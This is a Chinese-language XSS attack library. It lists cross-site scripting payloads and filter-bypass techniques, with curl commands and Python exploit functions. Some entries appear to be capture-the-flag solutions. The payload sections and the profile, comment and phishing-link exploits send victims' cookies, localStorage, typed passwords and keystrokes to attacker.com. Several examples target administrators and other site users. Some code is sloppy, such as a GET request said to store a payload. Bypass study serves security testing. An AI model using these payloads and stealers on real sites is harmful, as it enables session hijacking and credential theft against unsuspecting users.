# XSS 跨站脚本攻击 - 攻击库
**Keywords**: XSS, Cross-Site Scripting, Reflected XSS, Stored XSS, DOM XSS, JavaScript Injection, Event Handler

## 核心Payload库

### 基础XSS
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### 事件处理器集合（未被过滤的）
```html
<!-- 常被过滤：onclick, onload, onerror, onmouseover -->

<!-- 未被过滤的替代：-->
<img src=x onloadstart=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<details ontoggle=alert('XSS') open>
<marquee onstart=alert('XSS')>XSS</marquee>
<textarea onfocus=alert('XSS') autofocus>
<body onpageshow=alert('XSS')>
<video onloadstart=alert('XSS')><source>
<select onfocus=alert('XSS') autofocus>x</select>
```

### 字符编码绕过
```javascript
// 使用String.fromCharCode编码
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))>

// Base64编码
<img src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))>

// 十六进制编码
<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29')">
```

### 大小写混淆
```html
<SCRIPT>alert('XSS')</SCRIPT>
<Img Src=x OnErRor=alert('XSS')>
<SVG OnLoAd=alert('XSS')>
```

### 双扩展名/特殊字符
```html
<script>alert('XSS')</script%00>
<img src=x onerror='alert("XSS")'>
<img src=x onerror=alert('XSS')>
```

### 编码变体
```html
<!-- HTML实体编码 -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- URL编码 -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Unicode编码 -->
\u003cscript\u003ealert('XSS')\u003c/script\u003e
```

### 正则表达式绕过（<[a-yA-Y/]+）
```html
<!-- 被过滤：<s, <i, <m, <b等在a-y范围内 -->
<!-- 未被过滤：<z, <Z -->
<z z="x" onerror=alert('XSS')>
<Z z="x" onerror=alert('XSS')>
<zz zz="x" onerror=alert('XSS')>
```

### JSFuck终极绕过（仅使用[]()!+）
```javascript
// 使用JSFuck技术，可以用仅包含[]()!+的代码执行任意JS
// 工具：http://jsfuck.com
// 输入：alert('XSS')
// 输出：极长的JSFuck代码，仅使用[]()!+

// 示例原理：
[][(![]+[])[+[]]+([![]]+String)[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+...]
```

### 注释/特殊字符绕过
```html
<script>/**/alert('XSS')</script>
<img src=x onerror=/**/alert('XSS')>
<img src=x onerror='/**/alert("XSS")'>
```

## 攻击场景

### 场景1: 反射XSS
```bash
# 目标：GET参数未过滤
curl "http://target/search?q=<script>alert('XSS')</script>"
curl "http://target/page?name=<img src=x onerror=alert('XSS')>"

# 利用：构造钓鱼链接
http://target/search?q=<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">
```

### 场景2: 存储XSS
```bash
# 步骤1: 提交包含XSS的表单
curl -X POST "http://target/comment" \
  -d "text=<img src=x onerror=alert('XSS')>"

# 步骤2: 其他用户访问时自动触发
curl "http://target/view?id=1"  # 页面中的comment会执行XSS
```

### 场景3: DOM XSS
```javascript
// HTML
<div id="content"></div>

// 易受攻击的JavaScript
var userInput = location.hash.substring(1);
document.getElementById('content').innerHTML = userInput;  // ❌

// 利用
http://target/page#<img src=x onerror=alert('XSS')>

// 修复
document.getElementById('content').textContent = userInput;  // ✅
```

## 实际案例提取

### 案例004: 黑名单绕过
```bash
# 过滤：script, onload, onmouseover, onclick, onbegin, onerror, svg, '

# 绕过1：使用onloadstart
curl -X POST http://target:5000/xss25 \
  -d 'solution=<img src=x onloadstart=alert("XSS")>'

# 绕过2：使用details+ontoggle
curl -X POST http://target:5000/xss25 \
  -d 'solution=<details open ontoggle=alert("XSS")>'

# 绕过3：使用双引号代替单引号
curl -X POST http://target:5000/xss25 \
  -d 'solution=<img src=x onloadstart=alert("XSS")>'
```

### 案例010: JSFuck极限绕过
```bash
# 过滤：所有字母、数字、尖括号

# 使用JSFuck生成纯符号payload
# http://jsfuck.com -> 输入 alert('XSS') -> 得到JSFuck代码

curl -X POST http://target:5000/page \
  -d 'name=[JSFuck编码]'
```

### 案例013: 简单黑名单绕过
```bash
# 过滤：alert, confirm

# 绕过1：使用prompt
curl "http://target:5000/page?name=<script>prompt(%22XSS%22)</script>"

# 绕过2：使用eval + String.fromCharCode
curl "http://target:5000/page?name=<img%20src=x%20onerror=eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))>"

# 绕过3：大小写混淆
curl "http://target:5000/page?name=<SCRIPT>ALERT(%22XSS%22)</SCRIPT>"
```

### 案例018: 正则表达式绕过
```bash
# 过滤regex: <[a-yA-Y/]+
# 故意排除z和Z

curl "http://target:5000/page?name=<z%20z=%22x%22%20onerror=alert(%22XSS%22)>"
# 或
curl "http://target:5000/page?name=<Z%20z=%22x%22%20onerror=alert(%22XSS%22)>"
```

## 快速测试命令

```bash
# 基础测试
curl -G "http://target/page" --data-urlencode "q=<img src=x onerror=alert('XSS')>"

# POST测试
curl -X POST "http://target/comment" -d "text=<script>alert('XSS')</script>"

# Header测试
curl -H "User-Agent: <img src=x onerror=alert('XSS')>" "http://target/"

# Cookie测试
curl --cookie "id=<script>alert('XSS')</script>" "http://target/"

# JSON测试
curl -X POST "http://target/api" \
  -H "Content-Type: application/json" \
  -d '{"name": "<img src=x onerror=alert('"'"'XSS'"'"')>"}'
```

## 数据窃取Payload

```javascript
// 窃取cookie
<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">

// 窃取localStorage
<script>
fetch('http://attacker.com/log', {
  method: 'POST',
  body: JSON.stringify(localStorage)
})
</script>

// 窃取form数据
<script>
document.addEventListener('input', (e) => {
  if (e.target.type === 'password') {
    new Image().src = 'http://attacker.com/log?p=' + e.target.value;
  }
});
</script>

// 键盘记录
<script>
document.addEventListener('keypress', (e) => {
  fetch('http://attacker.com/log?k=' + e.key);
});
</script>
```

## 场景1: 搜索框Stored XSS

### 场景描述
搜索功能直接显示用户输入的内容，未进行过滤

### 利用Payload

```bash
# 基础XSS
curl -G "http://target/search" --data-urlencode 'q=<img src=x onerror=alert(1)>'
curl -G "http://target/search" --data-urlencode 'q=<svg/onload=alert(1)>'

# 编码绕过
curl -G "http://target/search" --data-urlencode 'q=<img src=x onerror="eval(atob(\"YWxlcnQoMSk=\"))" >'

# 事件处理器组合
curl -G "http://target/search" --data-urlencode 'q=<body onload=fetch("http://attacker.com/log")>'
```

### Python EXP

```python
def exploit_search_xss(target, payload):
    """
    搜索框XSS
    """
    params = {"q": payload, "search": 1}
    
    # 保存payload到数据库
    r = requests.get(f"{target}/search", params=params)
    
    # 其他用户访问搜索页面时会执行XSS
    r = requests.get(f"{target}/search", params=params)
    print(f"[+] Stored XSS: {r.text}")

# 测试
xss_payloads = [
    "<img src=x onerror=fetch('http://attacker.com/log')>",
    "<svg onload=fetch(location.href)>",
    "<iframe src=javascript:alert(1)>",
]

for payload in xss_payloads:
    exploit_search_xss("http://target", payload)
```

## 场景2: 用户名/个人资料XSS

### 场景描述
用户可以设置昵称/个人资料，该内容在他人访问时显示

### 利用Payload

```bash
# 设置XSS用户名
curl -X POST "http://target/api/profile/update" \
  -H "Content-Type: application/json" \
  -b "auth=$TOKEN" \
  -d '{"username": "<img src=x onerror=\"fetch(\\\"http://attacker.com/log?c=\\\" + document.cookie)\""}'

# 在个人资料中插入XSS
curl -X POST "http://target/profile/edit" \
  -b "auth=$TOKEN" \
  -d "bio=<script>alert('XSS in bio')</script>&name=<img src=x onerror=alert(1)>"
```

### Python EXP

```python
def exploit_profile_xss(target, token):
    """
    个人资料XSS - 当他人查看时触发
    """
    headers = {"Authorization": f"Bearer {token}"}
    
    # 设置XSS个人资料
    payload = {
        "username": "<img src=x onerror=\"fetch('http://attacker.com/steal?c=' + document.cookie)\">",
        "bio": "<svg/onload=\"new Image().src='http://attacker.com/log'\"/>",
        "avatar": "javascript:alert('XSS')"
    }
    
    r = requests.post(f"{target}/api/profile", headers=headers, json=payload)
    print(f"[+] XSS个人资料已设置")
    
    # 诱导管理员/其他用户访问
    # 他们访问时会执行XSS
```

## 场景3: 评论/留言XSS

### 场景描述
用户评论直接显示在页面上，未进行过滤和转义

### 利用Payload

```bash
# 在评论中注入XSS
curl -X POST "http://target/posts/123/comments" \
  -d "text=<script>alert('XSS in comment')</script>" \
  -b "sid=$SID"

# 编码规避
curl -X POST "http://target/api/comments" \
  -H "Content-Type: application/json" \
  -d '{"content": "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\">" }'

# 事件处理
curl -X POST "http://target/comments" \
  -d "message=<input onfocus=alert(1) autofocus>" \
  -d "post_id=999"
```

### Python EXP

```python
def exploit_comments_xss(target, session_id, post_id):
    """
    评论XSS - 收集访问者的Cookie
    """
    cookies = {"session": session_id}
    
    # payload: 当其他用户访问时窃取Cookie
    xss_payload = '<img src=x onerror="fetch(\'http://attacker.com/log\', {method:\'POST\', body: document.cookie})" />'
    
    r = requests.post(f"{target}/posts/{post_id}/comments",
                     cookies=cookies,
                     data={"comment": xss_payload})
    
    print(f"[+] XSS评论已发布")
    # 访问者会自动请求attacker.com，可以在那边收集cookie
```

## 场景4: Reflected XSS (URL参数)

### 场景描述
某个参数的值直接显示在页面上，如"您搜索了: $q"

### 利用Payload

```bash
# 基础reflected XSS
curl "http://target/status?msg=<img src=x onerror=alert(1)>"

# 在属性中注入
curl "http://target/page?title=\"><script>alert(1)</script><input type=\"hidden\""

# 事件处理器
curl "http://target/error?code=<svg onload=alert(1)>"

# URL编码规避
curl "http://target/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
```

### Python EXP + Phishing链接

```python
def generate_xss_link(target, payload):
    """
    生成XSS Phishing链接
    """
    from urllib.parse import urlencode
    
    # 编码payload
    params = {"msg": payload}
    encoded = urlencode(params)
    
    # 生成短链
    link = f"{target}/status?{encoded}"
    print(f"[*] XSS链接: {link}")
    
    # 在邮件/IM中分享此链接
    # 受害者点击时会执行XSS
    return link

# 使用
xss_payload = "<img src=x onerror=\"fetch('http://attacker.com/log?cookie=' + document.cookie)\"/>"
generate_xss_link("http://target", xss_payload)
```

## 场景5: DOM-based XSS

### 场景描述
JavaScript代码直接使用用户输入（location.hash, window.name等）更新DOM

### 利用Payload

```bash
# 利用location.hash
http://target/page#<img src=x onerror=alert(1)>

# 利用query参数
http://target/page?redirect=javascript:alert(1)

# 利用ref/referer
curl -e "<img src=x onerror=alert(1)>" "http://target/page"
```

### Python EXP

```python
def exploit_dom_xss(target):
    """
    DOM-based XSS
    """
    # 通常这类XSS在客户端执行，可以通过Selenium测试
    from selenium import webdriver
    
    driver = webdriver.Chrome()
    
    # 注入XSS到hash
    driver.get(f"{target}/page#<img src=x onerror='fetch(\"http://attacker.com/log\")'/>")
    
    # 检查是否执行
    import time
    time.sleep(1)
    
    # 检查attacker.com的日志
```

## 场景6: Content-Type绕过

### 场景描述
上传或输入某种MIME类型的文件/内容，在浏览时执行XSS

### 利用Payload

```bash
# 上传SVG文件（被当作图片显示）
echo '<svg onload=alert(1)>' > evil.svg
curl -F "file=@evil.svg" "http://target/upload"

# 上传HTML (content-type: image/jpeg)
echo '<img src=x onerror=alert(1)>' > evil.html
curl -F "file=@evil.html;type=image/jpeg" "http://target/upload"

# 设置错误的Content-Type
curl -H "Content-Type: image/png" \
  -d '<script>alert(1)</script>' \
  "http://target/api/upload"
```

## 绕过检测清单

- [ ] 尝试所有未被过滤的事件处理器
- [ ] 尝试字符编码（Base64, URL, Unicode, Hex）
- [ ] 尝试大小写混淆
- [ ] 尝试HTML实体编码
- [ ] 尝试注释符号 `/* */`
- [ ] 尝试换行符 `%0a`
- [ ] 尝试Tab符号 `%09`
- [ ] 尝试空格变体（空字节`%00`等）
- [ ] 尝试JSFuck/JSUnicode极端编码
- [ ] 尝试正则表达式缺陷（如故意排除某字母）

